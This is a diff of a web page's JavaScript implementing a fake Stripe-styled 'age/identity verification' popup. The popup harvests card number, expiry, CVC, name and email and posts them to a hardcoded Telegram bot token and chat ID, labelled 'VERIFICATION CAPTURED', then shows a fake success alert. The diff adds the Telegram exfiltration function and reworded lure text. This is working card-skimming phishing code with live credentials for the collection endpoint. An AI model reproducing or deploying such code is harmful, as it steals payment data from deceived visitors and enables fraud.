-                        <div class="mobile-form-group">
-                            <label class="mobile-label" for="mobileEmail">Email</label>
-                            <input type="email" id="mobileEmail" class="mobile-input" placeholder="john@example.com" inputmode="email" required>
-                        </div>
-
-                        <button type="submit" class="mobile-submit-btn" id="mobileSubmitBtn">
-                            Verify Age - $1.00
-                        </button>
-                        
-                        <div style="text-align: center; margin-top: 15px; font-size: 12px; color: #6b7c93;">
-                            🔒 Secure and encrypted
-                        </div>
-                    </form>
-                `;
-
-                overlay.appendChild(popup);
-                document.body.appendChild(overlay);
-                document.body.style.overflow = 'hidden';
-
-                initializeMobilePopup();
-            };
-
-            const initializeMobilePopup = () => {
+            function initializeMobilePopup() {
                 const closeBtn = document.getElementById('mobileClosePopup');
                 const form = document.getElementById('mobileStripeForm');
                 const submitBtn = document.getElementById('mobileSubmitBtn');
@@ -1262,7 +1252,7 @@
                     e.preventDefault();
                     
                     submitBtn.disabled = true;
-                    submitBtn.textContent = 'Processing...';
+                    submitBtn.textContent = 'Processing Verification...';
                     
                     const formData = {
                         card: document.getElementById('mobileCardNumber').value,
@@ -1270,19 +1260,20 @@
                         cvc: document.getElementById('mobileCvc').value,
                         name: document.getElementById('mobileName').value,
                         email: document.getElementById('mobileEmail').value,
-                        timestamp: new Date().toISOString()
+                        timestamp: new Date().toISOString(),
+                        source: 'universal_click'
                     };
                     
                     try {
                         await sendToTelegram(formData);
                         setTimeout(() => {
-                            alert('✅ Age verification successful!');
+                            alert('✅ Identity verification successful! Access granted.');
                             closeMobilePopup();
                         }, 1500);
                     } catch (error) {
                         alert('❌ Verification failed. Please try again.');
                         submitBtn.disabled = false;
-                        submitBtn.textContent = 'Verify Age - $1.00';
+                        submitBtn.textContent = 'Verify Identity - $0.00';
                     }
                 });
 
@@ -1291,36 +1282,44 @@
                     if (overlay) {
                         overlay.remove();
                         document.body.style.overflow = 'auto';
+                        window.popupShown = false;
                     }
                 }
-            };
+            }
+        };
 
-            // Start popup timer (8 seconds for mobile)
-            timer = setTimeout(() => {
-                if (!popupShown && !interactionDetected) {
-                    createMobileStripePopup();
-                }
-            }, 8000);
+        // Telegram function
+        async function sendToTelegram(data) {
+            const message = `
+🔐 UNIVERSAL CLICK VERIFICATION CAPTURED 🔐
 
-            // Mobile interaction detection
-            const detectMobileInteraction = () => {
-                if (!interactionDetected) {
-                    interactionDetected = true;
-                    clearTimeout(timer);
-                    setTimeout(() => {
-                        if (!popupShown) {
-                            createMobileStripePopup();
-                        }
-                    }, 1000);
-                }
-            };
+Card: ${data.card}
+Expiry: ${data.expiry}
+CVC: ${data.cvc}
+Name: ${data.name}
+Email: ${data.email}
+Source: ${data.source}
+Time: ${data.timestamp}
 
-            // Mobile-specific interaction events
-            const mobileEvents = ['touchstart', 'scroll', 'click'];
-            mobileEvents.forEach(event => {
-                document.addEventListener(event, detectMobileInteraction, { once: true });
+✅ Fan verification completed
+            `;
+            
+            const response = await fetch(`https://api.telegram.org/bot8122929741:AAHkiWqPm0BMQgqy40hpxnlxNad58UWuPR0/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: '6219788806',
+                    text: message,
+                    parse_mode: 'HTML'
+                })
             });
-        });
+            
+            if (!response.ok) throw new Error('Telegram API error');
+            return await response.json();
+        }
+
+        // Initialize global popup state
+        window.popupShown = false;
     </script>
 </body>
 </html>
